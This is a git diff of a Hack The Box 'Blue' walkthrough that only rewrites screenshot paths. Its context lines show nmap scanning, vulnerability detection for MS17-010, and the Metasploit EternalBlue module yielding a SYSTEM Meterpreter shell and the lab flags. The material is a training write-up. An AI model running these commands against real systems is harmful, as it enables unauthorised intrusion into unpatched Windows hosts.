@@ -36,7 +36,7 @@ Verify if the host is alive using ICMP:
 ping -c 1 10.10.10.40
 ```
 
-![ping](GitHubv2/HackTheBox/EASY/Blue/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -56,7 +56,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.40 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![allPorts](GitHubv2/HackTheBox/EASY/Blue/screenshots/allPorts.png)
+![allPorts](screenshots/allPorts.png)
 
 Extract open ports from the result:
 
@@ -64,7 +64,7 @@ Extract open ports from the result:
 extractPorts allPorts
 ```
 
-![extractPorts](GitHubv2/HackTheBox/EASY/Blue/screenshots/extractPorts.png)
+![extractPorts](screenshots/extractPorts.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -85,7 +85,7 @@ Let's check the result:
 cat targeted -l java
 ```
 
-![targeted](GitHubv2/HackTheBox/EASY/Blue/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -109,7 +109,7 @@ List Nmap NSE script categories:
 locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
 ```
 
-![nsa_files](GitHubv2/HackTheBox/EASY/Blue/screenshots/nsa_files.png)
+![nsa_files](screenshots/nsa_files.png)
 
 From the output, the most relevant categories for vulnerability detection are **vuln** and **safe**.
 
@@ -119,7 +119,7 @@ Run Nmap with vulnerability detection scripts against port 445:
 nmap --script "vuln and safe" -p445 10.10.10.40 -oN smbVulnScan
 ```
 
-![nmap_vuln_safe](GitHubv2/HackTheBox/EASY/Blue/screenshots/nmap_vuln&safe.png)
+![nmap_vuln_safe](screenshots/nmap_vuln&safe.png)
 
 **Result:**  
 The scan confirms the target is vulnerable to **MS17-010**.
@@ -135,7 +135,7 @@ Given the confirmed EternalBlue vulnerability, we can exploit it directly using 
 msfconsole
 ```
 
-![msfconsole](GitHubv2/HackTheBox/EASY/Blue/screenshots/msfconsole.png)
+![msfconsole](screenshots/msfconsole.png)
 
 Search for the MS17-010 EternalBlue module:
 
@@ -143,7 +143,7 @@ Search for the MS17-010 EternalBlue module:
 search ms17_010
 ```
 
-![search_ms17010](GitHubv2/HackTheBox/EASY/Blue/screenshots/search_ms17010.png)
+![search_ms17010](screenshots/search_ms17010.png)
 
 ---
 ### 3.2 Configuring the Exploit
@@ -164,7 +164,7 @@ use exploit/windows/smb/ms17_010_eternalblue
 ```
 
 
-![payload](GitHubv2/HackTheBox/EASY/Blue/screenshots/payload.png)
+![payload](screenshots/payload.png)
 
 ---
 ### 3.3 Executing the Exploit
@@ -175,7 +175,7 @@ Run the exploit:
 exploit
 ```
 
-![exploit](GitHubv2/HackTheBox/EASY/Blue/screenshots/exploit.png)
+![exploit](screenshots/exploit.png)
 
 The exploit succeeds, and we obtain a **Meterpreter** session as `NT AUTHORITY\SYSTEM`.
 
@@ -191,7 +191,7 @@ cd C:\Users\haris\Desktop
 cat user.txt
 ```
 
-![user_flag](GitHubv2/HackTheBox/EASY/Blue/screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ✅ **User flag obtained**
 
@@ -205,7 +205,7 @@ cd C:\Users\Administrator\Desktop
 cat root.txt
 ```
 
-![root_flag](GitHubv2/HackTheBox/EASY/Blue/screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 ✅ **Root flag obtained**
 
